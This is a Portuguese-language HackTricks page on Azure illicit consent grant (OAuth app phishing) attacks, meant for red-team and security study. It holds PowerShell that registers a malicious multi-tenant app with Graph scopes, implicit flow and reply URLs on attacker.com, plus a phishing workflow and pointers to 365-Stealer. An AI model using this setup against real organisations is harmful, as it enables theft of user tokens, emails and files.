# Az - Concess√£o de Consentimento Il√≠cito

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## Phishing de Aplicativo OAuth

**As Aplica√ß√µes Azure** solicitam permiss√µes para acessar os **dados do usu√°rio** (informa√ß√µes b√°sicas, mas tamb√©m acesso a documentos, envio de e-mails...).\
Se **permitido**, um usu√°rio normal pode conceder consentimento apenas para **permiss√µes de "Baixo Impacto"**. Em **todos os outros** casos, **√© necess√°rio o consentimento do administrador**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` e uma fun√ß√£o personalizada incluindo `permiss√£o para conceder permiss√µes a aplicativos` podem fornecer consentimento em n√≠vel de locat√°rio.

Somente permiss√µes que **n√£o requerem consentimento do administrador** s√£o classificadas como **baixo impacto**. Essas s√£o permiss√µes necess√°rias para **login b√°sico, como openid, profile, email, User.Read e offline\_access**. Se uma **organiza√ß√£o** **permite** o consentimento do usu√°rio para **todos os aplicativos**, um funcion√°rio pode conceder consentimento a um aplicativo para **ler as informa√ß√µes acima de seu perfil**.

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

Portanto, um atacante poderia preparar um **Aplicativo malicioso** e, com um **phishing**, fazer o usu√°rio **aceitar o Aplicativo e roubar seus dados**.

### 2 Tipos de Ataques de Concess√£o de Consentimento Il√≠cito

* **N√£o autenticado**: A partir de uma conta externa, crie um aplicativo com as permiss√µes `User.Read` e `User.ReadBasic.All`, por exemplo, pesque um usu√°rio e voc√™ poder√° acessar informa√ß√µes do diret√≥rio.
* Isso requer que o usu√°rio pescado possa aceitar aplicativos OAuth de ambientes externos!
* **Autenticado**: Tendo comprometido um principal com privil√©gios suficientes, crie um aplicativo dentro da conta e pesque algum usu√°rio privilegiado que possa aceitar permiss√µes privilegiadas do OAuth.
* Neste caso, voc√™ j√° pode acessar as informa√ß√µes do diret√≥rio, ent√£o a permiss√£o `User.ReadBasic.All` n√£o √© mais interessante.
* Voc√™ provavelmente est√° interessado em **permiss√µes que requerem um administrador para conced√™-las**, porque o usu√°rio comum n√£o pode dar permiss√£o a aplicativos OAuth, por isso voc√™ precisa **pescar apenas esses usu√°rios** (mais sobre quais fun√ß√µes/permiss√µes concedem esse privil√©gio posteriormente)

### Verificar se os usu√°rios est√£o autorizados a consentir

O comando PowerShell a seguir √© usado para verificar a configura√ß√£o de consentimento para usu√°rios no Azure Active Directory (Azure AD) em rela√ß√£o √† capacidade de consentir em aplicativos:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **Desativar consentimento do usu√°rio**: Essa configura√ß√£o pro√≠be os usu√°rios de conceder permiss√µes a aplicativos. Nenhum consentimento do usu√°rio para aplicativos √© permitido.
* **Usu√°rios podem consentir em aplicativos de editores verificados ou de sua organiza√ß√£o, mas apenas para permiss√µes selecionadas**: Essa configura√ß√£o permite que todos os usu√°rios concedam consentimento apenas para aplicativos publicados por um editor verificado e aplicativos registrados em seu pr√≥prio locat√°rio. Adiciona uma camada de controle ao permitir consentimento apenas para permiss√µes espec√≠ficas.
* **Usu√°rios podem consentir em todos os aplicativos**: Essa configura√ß√£o √© mais permissiva e permite que todos os usu√°rios concedam consentimento para quaisquer permiss√µes de aplicativos, desde que essas permiss√µes n√£o exijam consentimento administrativo.
* **Pol√≠tica de consentimento de aplicativo personalizada**: Essa configura√ß√£o indica que uma pol√≠tica personalizada est√° em vigor, que pode ser adaptada √†s exig√™ncias organizacionais espec√≠ficas e pode envolver uma combina√ß√£o de restri√ß√µes com base no editor do aplicativo, nas permiss√µes solicitadas pelo aplicativo e em outros fatores.

## **Compreendendo o Ataque de Concess√£o de Consentimento Il√≠cito**

Em um ataque de concess√£o de consentimento il√≠cito, os atacantes enganam os usu√°rios finais para conceder permiss√µes a um aplicativo malicioso registrado no Azure. Isso √© feito fazendo com que o aplicativo pare√ßa leg√≠timo, levando as v√≠timas a clicar inadvertidamente em um bot√£o "Aceitar". Como resultado, o Azure AD emite um token para o site do atacante, permitindo que eles acessem e manipulem os dados da v√≠tima, como ler ou enviar e-mails e acessar arquivos, sem precisar de uma conta organizacional.

## **Vis√£o Geral do Fluxo do Ataque**

O ataque envolve v√°rias etapas visando uma empresa gen√©rica. Veja como ele pode se desenrolar:

1. **Registro de Dom√≠nio e Hospedagem de Aplicativo**: O atacante registra um dom√≠nio semelhante a um site confi√°vel, por exemplo, "safedomainlogin.com". Sob esse dom√≠nio, √© criado um subdom√≠nio (por exemplo, "nomedaempresa.safedomainlogin.com") para hospedar um aplicativo projetado para capturar c√≥digos de autoriza√ß√£o e solicitar tokens de acesso.
2. **Registro do Aplicativo no Azure AD**: O atacante ent√£o registra um Aplicativo Multi-Tenant em seu Locat√°rio do Azure AD, nomeando-o com o nome da empresa-alvo para parecer leg√≠timo. Eles configuram o URL de Redirecionamento do aplicativo para apontar para o subdom√≠nio que hospeda o aplicativo malicioso.
3. **Configura√ß√£o de Permiss√µes**: O atacante configura o aplicativo com v√°rias permiss√µes de API (por exemplo, `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Essas permiss√µes, uma vez concedidas pelo usu√°rio, permitem que o atacante extraia informa√ß√µes sens√≠veis em nome do usu√°rio.
4. **Distribui√ß√£o de Links Maliciosos**: O atacante cria um link contendo o ID do cliente do aplicativo malicioso e o compartilha com os usu√°rios-alvo, enganando-os para conceder consentimento.

## **Utilizando Ferramentas para o Ataque**

O ataque pode ser facilitado usando ferramentas como [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer).

### Prepara√ß√£o Pr√©-Ataque:

Se o atacante tiver algum n√≠vel de acesso a um usu√°rio na organiza√ß√£o da v√≠tima, ele pode verificar se a pol√≠tica da organiza√ß√£o permite que o usu√°rio aceite aplicativos:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
Para executar o ataque, o atacante precisaria criar um **novo aplicativo em seu Azure Tenant** (em Registros de Aplicativos), configurado com as permiss√µes:

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` est√° dentro de `Microsoft Graph` em `Permiss√µes delegadas`. (Permiss√µes de aplicativo sempre precisar√£o de aprova√ß√£o adicional).

* `User.ReadBasic.All` √© a permiss√£o que permitir√° que voc√™ **leia informa√ß√µes de todos os usu√°rios** na organiza√ß√£o se concedida.
* Lembre-se de que somente `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` e uma fun√ß√£o personalizada incluindo `permiss√£o para conceder permiss√µes a aplicativos` podem fornecer consentimento em n√≠vel de locat√°rio. Portanto, voc√™ deve **phish um usu√°rio com uma dessas fun√ß√µes** se quiser que ele aprove um **Aplicativo que requer consentimento de administrador**.

Voc√™ tamb√©m pode criar um aplicativo via cli com:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

Verifique [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) para aprender como configur√°-lo.

{% hint style="warning" %}
Note que o **token de acesso** obtido ser√° para o **endpoint de gr√°ficos** com os escopos: `User.Read` e `User.ReadBasic.All` (as permiss√µes solicitadas). Voc√™ n√£o poder√° realizar outras a√ß√µes (mas essas s√£o suficientes para **baixar informa√ß√µes sobre todos os usu√°rios** na organiza√ß√£o).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Voc√™ tamb√©m pode usar essa ferramenta para realizar esse ataque.

## P√≥s-Explora√ß√£o

Depois de obter acesso ao usu√°rio, voc√™ pode fazer coisas como roubar documentos sens√≠veis e at√© mesmo fazer upload de arquivos de documentos com backdoor.

## Refer√™ncias

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
